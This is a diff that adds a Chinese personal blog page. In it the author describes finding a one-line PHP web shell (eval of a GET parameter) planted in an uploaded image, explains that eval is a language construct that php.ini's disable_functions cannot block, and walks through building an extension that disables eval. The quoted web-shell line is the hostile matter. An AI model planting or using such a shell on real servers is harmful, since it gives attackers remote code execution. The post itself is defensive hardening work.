@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>php禁用eval | kala的博客 | 个人学习笔记、踩坑记录、感悟分享</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="php">
+    <meta name="description" content="最近在做的一个项目，网站被人用图片挂木马了，图片里是一段PHP代码 1&lt;?php eval($_GET[&#39;k&#39;]); ?&gt;  虽然网站还不至于被随意宰割，但是这可不是个小问题，图片挂马这种东西我暂时还研究不透，就先把eval函数禁用吧 打开php.ini，找到disable_functions，添加上eval，保存重启php。。。 12#### 语言结构和函数34原来，&#96;&amp;#9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php禁用eval">
+<meta property="og:url" content="http:&#x2F;&#x2F;blog.c2wei.cn&#x2F;2019&#x2F;04&#x2F;18&#x2F;php%E7%A6%81%E7%94%A8eval&#x2F;index.html">
+<meta property="og:site_name" content="kala的博客">
+<meta property="og:description" content="最近在做的一个项目，网站被人用图片挂木马了，图片里是一段PHP代码 1&lt;?php eval($_GET[&#39;k&#39;]); ?&gt;  虽然网站还不至于被随意宰割，但是这可不是个小问题，图片挂马这种东西我暂时还研究不透，就先把eval函数禁用吧 打开php.ini，找到disable_functions，添加上eval，保存重启php。。。 12#### 语言结构和函数34原来，&#96;&amp;#9">
+<meta property="article:published_time" content="2019-04-18T09:11:16.000Z">
+<meta property="article:modified_time" content="2019-12-17T10:38:31.362Z">
+<meta property="article:author" content="kala">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">kala</h5>
+          <a href="mailto:clw_work@163.com" title="clw_work@163.com" class="mail">clw_work@163.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">php禁用eval</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">php禁用eval</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-18T09:11:16.000Z" itemprop="datePublished" class="page-time">
+  2019-04-18
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#禁用方法"><span class="post-toc-number">1.</span> <span class="post-toc-text">禁用方法</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-php禁用eval"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">php禁用eval</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-18 17:11:16" datetime="2019-04-18T09:11:16.000Z"  itemprop="datePublished">2019-04-18</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>最近在做的一个项目，网站被人用图片挂木马了，图片里是一段PHP代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'k'</span>]); <span class="meta">?&gt;</span></span></pre></td></tr></table></figure>
+
+<p>虽然网站还不至于被随意宰割，但是这可不是个小问题，图片挂马这种东西我暂时还研究不透，就先把eval函数禁用吧</p>
+<p>打开<code>php.ini</code>，找到<code>disable_functions</code>，添加上<code>eva</code>l，保存重启php。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">#### 语言结构和函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">原来，&#96;&#96;eval&#96;&#96;在php中，并不是一个函数，它是一个**语言结构**，也叫做**语言构造器**，语言结构看起来和函数一样，实际上它是php语法的一部分，也就是一个**关键字**。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">php执行时，函数都要被php解析器先进行解析，分解为语言结构才会进一步执行，就是说语言结构比函数效率更高。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">语言结构除了无法被&#96;&#96;&#96;php.ini&#96;&#96;&#96;中的&#96;&#96;&#96;disable_functions&#96;&#96;&#96;禁用外，也不能作为回调函数，可以通过&#96;&#96;&#96;function_exists()&#96;&#96;&#96;判断函数和语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$list &#x3D; [&#39;echo&#39;, &#39;print&#39;, &#39;isset&#39;, &#39;empty&#39;, &#39;eval&#39;, &#39;system&#39;, &#39;shell_exec&#39;,&#39;array_key_exists&#39;, &#39;array_map&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$rlt &#x3D; array_map(function($name) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	if (function_exists($name)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    return $name.&quot;:函数&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  &#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    return $name.&quot;:语言结构&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">&#125;, $list);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">print_r($list);</span></pre></td></tr></table></figure>
+
+<p>执行结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Array</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    [0] &#x3D;&gt; echo:语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    [1] &#x3D;&gt; print:语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    [2] &#x3D;&gt; isset:语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    [3] &#x3D;&gt; empty:语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    [4] &#x3D;&gt; eval:语言结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    [5] &#x3D;&gt; system:函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    [6] &#x3D;&gt; shell_exec:函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    [7] &#x3D;&gt; array_key_exists:函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    [8] &#x3D;&gt; array_map:函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">)</span></pre></td></tr></table></figure>
+
+<p>可以看到我们熟悉的<code>isset</code>，<code>empty</code>都是语言结构，尽管用起来和函数一样</p>
+<h4 id="禁用方法"><a href="#禁用方法" class="headerlink" title="禁用方法"></a>禁用方法</h4><p>通过安装一个拓展，php5和php7都适用，拓展github地址：<a href="https://github.com/mk-j/PHP_diseval_extension" target="_blank" rel="noopener">PHP_diseval_extension</a></p>
+<p>作者提供了安装脚本，不过我没有使用，还是自己安装得劲</p>
+<p>拉取仓库并切换到拓展源码目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mk-j&#x2F;PHP_diseval_extension.git</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cd PHP_diseval_extension&#x2F;source</span></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">phpize</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">.&#x2F;configure --with-php-config&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin&#x2F;php-config  #注意更改php-config地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">make</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">sudo make install</span></pre></td></tr></table></figure>
+
+<p>成功后出现<code>.so</code>文件的位置，复制一下</p>
+<p>打开<code>php.ini</code>，添加<code>extension = &quot;/your_path/diseval.so&quot;;</code></p>
+<p>保存重启php，OK</p>
+<p>下一步要研究图片挂马。。。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://blog.c2wei.cn">
+            <img src="/img/avatar.jpg" alt="kala">
+            kala
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
+
+
+            
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/09/11/hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">hexo搭建个人博客</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/09/12/ubuntu18%E5%AE%89%E8%A3%85sublime%E5%8F%8A%E8%A7%A3%E5%86%B3%E4%B8%8D%E8%83%BD%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ubuntu18安装sublime及解决不能中文输入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>kala &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
